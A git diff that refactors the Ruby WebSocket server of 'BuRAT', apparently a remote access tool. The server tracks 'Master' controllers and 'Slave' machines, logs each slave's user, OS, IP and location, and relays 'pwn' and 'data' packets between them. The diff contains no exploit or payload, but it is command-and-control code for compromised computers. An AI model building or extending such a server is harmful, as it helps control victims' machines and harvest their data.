@@ -2,8 +2,8 @@ require 'faye/websocket'
 require 'json'
 
 require_relative 'lib/client'
-require_relative 'lib/client_inator'
-require_relative 'lib/pipe_inator'
+require_relative 'lib/inator'
+require_relative 'lib/pipe'
 
 module BuRAT
   class WebSocketServer
@@ -12,7 +12,6 @@ module BuRAT
     def initialize(app)
       @app     = app
       @clients = []
-      @pipe_inator = PipeInator.new()
     end
 
     def call(env)
@@ -33,12 +32,19 @@ module BuRAT
             payload = packet['payload']     # payload
             trailer = packet['trailer']     # trailer
 
-            p trailer                       # debug
+            p header
+            #p trailer                       # debug
 
-            if header == "deathnote" then                 # deathnote
-              deathnote(payload, ws)                      # payload = deathnote query
-            elsif header == "identification" then         # identification
-              identification(payload, ws)                 # payload = client details
+            if header == "client_list" then               # list of client
+              packet = packet('client_list', @clients, 'deathnote')
+              ws.send(packet)
+            elsif header == "client_identification" then  # identification
+              client = @clients.find { |client| client["id"] == payload['id'] }
+              payload.store("status", "Online")
+              payload.store("ws", ws)
+              client == nil ? @clients << payload : client.replace(payload)
+              packet = packet('client_status', payload, "disconnected")
+              master('*', packet)
             elsif header == "data" then                   # data
               data(payload, trailer)                      # payload = data from slave to master
             elsif header == "pwn" then                    # pwn
@@ -56,22 +62,11 @@ module BuRAT
 
         # CLOSE
         ws.on :close do |event|
-          @clients.each do |client|
-            if client.ws == ws then
-              client.status = "Offline"
-              client.ws = nil
-
-              inators = []
-              client.inators.each do |inator|
-                inators << {'code' => inator.code, 'name' => inator.name}
-              end
-              client = {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}
-
-              packet = packet('client', client, "disconnected")
-              master('*', packet)
-              break
-            end
-          end
+          client = @clients.find { |client| client["ws"] == ws }
+          client["status"] = "Offline"
+          client["ws"] = nil
+          packet = packet('client_status', client, "disconnected")
+          master('*', packet)
         end
 
         # Return async Rack response
@@ -83,105 +78,23 @@ module BuRAT
     end
 
     private
-
-    # DEATHNOTE
-    # {'header':'deathnote', 'payload':'query', 'trailer': ''}
-    def deathnote(payload, ws)
-      clients = []
-      @clients.each do |client|
-        inators = []
-        client.inators.each do |inator|
-          inators << {'code' => inator.code, 'name' => inator.name}
-        end
-        clients << {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}
+    def master(id, packet)
+      if id == "*" then
+        clients = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+        clients.each { |client| client["ws"].send(packet) }
+      else
+        client = @clients.find { |client| client["id"] == id && client["status"] == "Online" }
+        client["ws"].send(packet)
       end
-
-      header = 'deathnote'
-      payload = clients
-      trailer = 'deathnote'
-      packet = packet(header, payload, trailer)
-      ws.send(packet)
     end
 
-    # IDENTIFICATION
-    # {'header':'identification',
-    #  'payload':{
-    #             'id': '',
-    #             'type': '',
-    #             'name': '',
-    #             'computer': '',
-    #             'user': '',
-    #             'os': '',
-    #             'ip': '',
-    #             'country': '',
-    #             'city': '',
-    #             'inators': [{'id': '', 'name': ''}, {'id': '', 'name': ''}]
-    #            },
-    #  'trailer': ''}
-    def identification(payload, ws)
-      mode = "new"
-
-      @clients.each do |client|
-        if client.id != payload['id'] then
-          mode = "new"
-        elsif client.id == payload['id'] then
-          mode = "existing"
-          break
-        end
-      end
-
-      if mode == "new" then
-        inators = []
-        payload['inators'].each do |inator|
-          inators << ClientInator.new(inator['code'], inator['name'])
-        end
-        client = Client.new(payload['id'], payload['type'], payload['name'], payload['computer'], payload['user'], payload['os'], payload['ip'], payload['country'], payload['city'], "Online", inators, ws)
-        @clients << client
-
-        inators = []
-        client.inators.each do |inator|
-          inators << {'code' => inator.code, 'name' => inator.name}
-        end
-        client = {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}
-
-        header = 'client'
-        payload = client
-        trailer = "new client connected"
-        packet = packet(header, payload, trailer)
-        master('*', packet)
-      elsif mode == "existing" then
-        @clients.each do |client|
-          if client.id == payload['id'] then
-            client.type = payload['type']
-            client.name = payload['name']
-            client.computer = payload['computer']
-            client.user = payload['user']
-            client.os = payload['os']
-            client.ip = payload['ip']
-            client.country = payload['country']
-            client.city = payload['city']
-            client.status = "Online"
-            inators = []
-            payload['inators'].each do |inator|
-              inators << ClientInator.new(inator['code'], inator['name'])
-            end
-            client.inators = inators
-            client.ws = ws
-
-            inators = []
-            client.inators.each do |inator|
-              inators << {'code' => inator.code, 'name' => inator.name}
-            end
-            client = {'id' => client.id, 'type' => client.type, 'name' => client.name, 'computer' => client.computer, 'user' => client.user, 'os' => client.os, 'ip' => client.ip, 'country' => client.country, 'city' => client.city, 'status' => client.status, 'inators' => inators}
-
-            header = 'client'
-            payload = client
-            trailer = "connected"
-            packet = packet(header, payload, trailer)
-            master('*', packet)
-            break
-          end
-        end
+    def slave(id, packet)
+      if id == "*" then
+        clients = @clients.select { |client| client["type"] == "Slave" && client["status"] == "Online" }
+        clients.each { |client| client["ws"].send(packet) }
+      else
+        client = @clients.find { |client| client["id"] == id && client["status"] == "Online" }
+        client["ws"].send(packet)
       end
     end
 
@@ -208,43 +121,6 @@ module BuRAT
     #config
     def config(payload)
       p payload
-    end
-
-    #slave
-    def slave(id, packet)
-      if id == "*" then
-        @clients.each do |client|
-          if client.type == "Slave" && client.status == "Online" then
-            client.ws.send(packet)
-          end
-        end
-      else
-        @clients.each do |client|
-          if client.id == id && client.status == "Online" then
-            client.ws.send(packet)
-            break
-          end
-        end
-      end
-    end
-
-    #master
-    def master(id, packet)
-      if id == "*" then
-        @clients.each do |client|
-          if client.type == "Master" && client.status == "Online" then
-            client.ws.send(packet)
-            break
-          end
-        end
-      else
-        @clients.each do |client|
-          if client.id == id && client.status == "Online" then
-            client.ws.send(packet)
-            break
-          end
-        end
-      end
     end
 
     #packet
